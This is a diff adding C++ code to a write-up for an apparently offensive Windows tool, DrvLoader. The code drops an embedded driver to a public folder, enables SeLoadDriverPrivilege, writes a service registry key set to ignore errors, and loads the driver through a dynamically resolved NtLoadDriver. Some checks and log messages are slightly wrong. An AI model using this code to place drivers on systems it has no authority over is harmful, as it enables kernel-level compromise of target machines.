@@ -56,6 +56,42 @@ Prior to loading the driver, getting a driver onto a target system is the first 
 5. Create an empty file on disk for the resource by calling `CreateFile`, DrvLoader specifies `C:\Users\Public\<file>` as the location to drop the resource to disk.
 6. Using a handle from the prior `CreateFile` function call, use `WriteFile` to write the contents of the resource into the file from memory using the pointer to it that was obtained from `LockResource`. 
 
+```c++
+void dropDriverResourceToDisk()
+{
+	BOOL status = FALSE;
+
+	HRSRC findDriver = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+	if (findDriver)
+	{
+		HGLOBAL loadDriver = LoadResource(NULL, findDriver);
+		if (loadDriver)
+		{
+			DWORD sizeDriver = SizeofResource(NULL, findDriver);
+			if (sizeDriver)
+			{
+				LPVOID lockResource = LockResource(loadDriver);
+				if (lockResource)
+				{
+					HANDLE createDriver = CreateFile(L"C:\\Users\\Public\\lbdrv.sys", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+					if (createDriver)
+					{
+						DWORD dwBytesWritten = 0;
+						BOOL writeDriver = WriteFile(createDriver, lockResource, sizeDriver, &dwBytesWritten, NULL);
+						if (writeDriver)
+						{
+							printf("[+] Successfully wrote the driver to disk\n");
+						}
+					}
+					CloseHandle(createDriver);
+					FreeResource(findDriver);
+				}
+			}
+		}
+	}
+}
+```
+
 ### Obtaining the Required Privileges
 
 Before being able to load the kernel driver onto the system the process that loads a driver requires a few specific process access token privileges. First, the process should be running as an Administrator, DrvLoader checks this by querying the current processes process token with a function call to OpenProcessToken with TOKEN_QUERY set as the desired access, using the handle returned by this call, another call to GetTokenInformation is called with a pointer to the TOKEN_ELEVATION structure passed to it, checking the structures TokenIsElevated member allows DrvLoader to determine if the running process is running under the context of an Administrator or not.
@@ -63,6 +99,45 @@ Before being able to load the kernel driver onto the system the process that loa
 Next, in order to load a kernel driver, processes require the SeLoadDriverPrivilege privilege, even as an Administrator, this privilege is disabled by default. DrvLoader enables this privilege by making a call to LookupPrivilegeValue to add the privilege to the LUID structure, and then a subsequent call to AdjustTokenPrivileges to add the requested privilege to the current processes access token.
 
 ![image](https://user-images.githubusercontent.com/70239991/125863968-e410b60a-809d-4c38-9ddc-ddfac2b7825f.png)
+
+```c++
+void enableSeLoadDriverPrivilege()
+{
+	LUID luid;
+	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());
+	if (currentProc)
+	{
+		HANDLE TokenHandle(NULL);
+		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
+		if (hProcessToken)
+		{
+			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeLoadDriverPrivilege", &luid);
+
+			if (!checkToken)
+			{
+				printf("[+] Current process token already includes SeLoadDriverPrivilege\n");
+			}
+			else
+			{
+				TOKEN_PRIVILEGES tokenPrivs;
+
+				tokenPrivs.PrivilegeCount = 1;
+				tokenPrivs.Privileges[0].Luid = luid;
+				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
+
+				if (adjustToken != 0)
+				{
+					printf("[+] Added SeLoadDriverPrivilege to the current process token\n");
+				}
+			}
+			CloseHandle(TokenHandle);
+		}
+	}
+	CloseHandle(currentProc);
+}
+```
 
 1. Call `OpenProcess` to obtain a handle to the current process with the required access by PID with `GetCurrentProcessId`
 2. Open a handle to the current processes access token with `OpenProcessToken` and include the `TOKEN_ADJUST_PRIVILEGES` for the returned handle
@@ -86,6 +161,55 @@ Creating the necessary subkey and values can be done through the Reg* API functi
 4. Setting `ErrorControl` to 1 indicates that if the driver fails to start, ignore the problem and display no errors.
 5. Setting  `Start` to 3 indicates that the provided service need to be manually started by the user and it does not start automatically
 
+```c++
+void createRegKey()
+{
+	LPSECURITY_ATTRIBUTES lpSecurityAttributes = NULL;
+	HKEY phkResult;
+	DWORD lpdwDisposition;
+	WCHAR regPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\lbdrv";
+
+	LSTATUS createKey = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, lpSecurityAttributes, &phkResult, &lpdwDisposition);
+	if (createKey == ERROR_SUCCESS)
+	{
+		printf("[+] Registry key was created up for calling NtLoadDriver\n");
+
+		WCHAR driverPath[MAX_PATH] = { 0 };
+		_snwprintf_s(driverPath, MAX_PATH, _TRUNCATE, L"%ws%ws", L"\\??\\", L"C:\\Users\\Public\\lbdrv.sys");
+
+		SIZE_T ImagePathSize = (DWORD)(sizeof(wchar_t) * (wcslen(driverPath) + 1));
+		LSTATUS setKeyImagePath = RegSetValueEx(phkResult, L"ImagePath", 0, REG_EXPAND_SZ, (const BYTE*)driverPath, ImagePathSize);
+
+		if (setKeyImagePath == ERROR_SUCCESS)
+		{
+			printf("[+] Set the [ImagePath] value of the Registry key to the path of the driver\n");
+		}
+
+		DWORD lpData1Type = 1;
+		LSTATUS setKeyType = RegSetValueExW(phkResult, L"Type", 0, REG_DWORD, (const BYTE*)&lpData1Type, sizeof(DWORD));
+		if (setKeyType == ERROR_SUCCESS)
+		{
+			printf("[+] Set the [Type] value of the Registry key to 1\n");
+		}
+
+		DWORD lpData2ErrorControl = 1;
+		LSTATUS setKeyTypeErrorControl = RegSetValueExW(phkResult, L"ErrorControl", 0, REG_DWORD, (const BYTE*)&lpData2ErrorControl, sizeof(DWORD));
+		if (setKeyType == ERROR_SUCCESS)
+		{
+			printf("[+] Set the [ErrorControl] value of the Registry key to 1\n");
+		}
+
+		DWORD lpData3Start = 3;
+		LSTATUS setKeyStart = RegSetValueExW(phkResult, L"Start", 0, REG_DWORD, (const BYTE*)&lpData3Start, sizeof(DWORD));
+		if (setKeyType == ERROR_SUCCESS)
+		{
+			printf("[+] Set the [Start] value of the Registry key to 1\n");
+		}
+	}
+	RegCloseKey(phkResult);
+}
+```
+
 ![image](https://user-images.githubusercontent.com/70239991/125873133-e73087b0-0a1a-45d7-bb24-78e515e8fe56.png)
 
 ### Loading the Driver With /LOAD
@@ -93,6 +217,29 @@ Creating the necessary subkey and values can be done through the Reg* API functi
 Now that the current process contains the required access token privileges, and the necessary Registry keys have been created, we can call DrvLoader to initiate the loading of the driver. Calling NtLoadDriver directly won’t be possible, so instead calling `GetModuleHandle` to get a handle to ntdll.dll and then calling `GetProcAddress` to get the address of `NtLoadDriver` directly is the way to go. After dynamically resolving `NtLoadDriver` we can set up the Registry path and subkey that was previously created and set. 
 
 In order to pass this path to `NtLoadDriver` first intilizing it as a unicode string need to be done, this can be done by dynamically resolving the address of `RtlInitUnicodeString` and passing it the string along with a UNICODE_STRING type variable. Once the path has been set, passing the unicode variable that contains the Registry path and subkey to `NtLoadDriver` will cause the previously dropped driver on disk to be loaded directly into the Windows kernel and started.
+
+```c++
+void loadDriver()
+{
+	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(pNtdll, "NtLoadDriver");
+
+	UNICODE_STRING DriverServiceName = { 0 };
+	WCHAR regNamePath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\lbdrv";
+	RtlInitUnicodeString(&DriverServiceName, regNamePath);
+
+	NTSTATUS loadDrvStatus = NtLoadDriver(&DriverServiceName);
+
+	if (loadDrvStatus == ERROR_SUCCESS)
+	{
+		printf("[+] Sucessfully loaded the driver into the kernel via NtLoadDriver\n");
+	}
+	if (loadDrvStatus == STATUS_IMAGE_ALREADY_LOADED)
+	{
+		printf("[+] Driver is already loaded - STATUS_IMAGE_ALREADY_LOADED\n");
+	}
+	CloseHandle(pNtdll);
+}
+```
 
 ![image](https://user-images.githubusercontent.com/70239991/125891649-b20cab8a-ee21-4434-b5e7-f1dda6eefef8.png)
 
